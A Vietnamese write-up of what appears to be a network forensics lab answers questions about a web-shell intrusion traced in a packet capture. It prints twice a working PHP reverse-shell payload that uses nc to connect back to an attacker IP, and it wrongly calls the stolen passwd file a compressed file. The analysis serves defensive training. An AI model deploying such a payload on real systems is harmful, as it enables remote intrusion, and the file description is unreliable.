## Câu hỏi 1: Cuộc tấn công bắt nguồn từ thành phố nào?

Trong phần **Conversations**, IP `117.11.88.124` đã gửi **355 packet** — một dấu hiệu cho thấy đây có thể là attacker.

Khi truy vết địa lý bằng [ipinfo.io](https://ipinfo.io), IP này được xác định đến từ thành phố:

📍 **Tianjin, China**

![IP Location - Tianjin](https://github.com/user-attachments/assets/dfc02bce-de4f-4e06-8f59-b333630bbb44)

---

## Câu hỏi 2: Full User-Agent của kẻ tấn công là gì?

Dựa vào phân tích HTTP request trong Wireshark, ta có thể đọc được chuỗi **User-Agent** trong Header HTTP.

![User-Agent Packet](https://github.com/user-attachments/assets/57c096f8-6384-4f6c-946a-db4cf28264ac)

**Full User-Agent:** Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36

---

## Câu hỏi 3: Tên của web shell độc hại đã được tải lên?

Trong quá trình kiểm tra, phát hiện tệp đáng ngờ có tên:

📄 **image.jpg.php**

Payload được nhúng trong tệp PHP là reverse shell:
```php<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>```
📌 Đây là shell nguy hiểm nhằm mở kết nối ngược từ nạn nhân về attacker.
## ✅ Câu hỏi 4: Thư mục nào được trang web sử dụng để lưu trữ các tệp đã tải lên?

- Phân tích gói tin từ attacker cho thấy đường dẫn mà các tệp được tải lên là:

📁 **Thư mục upload**: `/reviews/uploads/`

- Đây là nơi attacker đã lưu trữ file shell độc hại (`image.jpg.php`) để truy cập và thực thi từ xa.

---

## ✅ Câu hỏi 5: Cổng nào được mở trên máy của kẻ tấn công là mục tiêu của web shell độc hại nhằm thiết lập giao tiếp ra bên ngoài trái phép?

- Phân tích nội dung web shell cho thấy reverse shell kết nối về IP attacker là `117.11.88.124`.

- Câu lệnh trong file shell:

```php <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>```
## ✅ Câu 6: Kẻ tấn công đang cố gắng đánh cắp tệp nào?
![{2B227BB3-4C82-40A9-B660-A49CA7316828}](https://github.com/user-attachments/assets/d5beb312-4e49-4bf4-ab34-0cb9f8f695d6)

📌 **Mục tiêu**: Nhận ra tầm quan trọng của dữ liệu bị xâm phạm để ưu tiên hành động ứng phó.

🔍 **Phân tích**:
- Dựa trên hình ảnh phân tích gói tin:
  - Source IP: `24.49.63.79` (máy nạn nhân)
  - Destination IP: `117.11.88.124` (máy attacker)
  - Phương thức: `POST`
  
📄 **Tệp bị đánh cắp**: `passwd`

🎯 Đây là một tệp nén có khả năng chứa thông tin quan trọng như dữ liệu đăng nhập, mật khẩu hoặc cấu hình nhạy cảm.

➡️ Kết luận: Kẻ tấn công đã dùng reverse shell để thực hiện hành vi trộm tệp `passwd` từ máy nạn nhân và gửi về máy chủ điều khiển của mình.

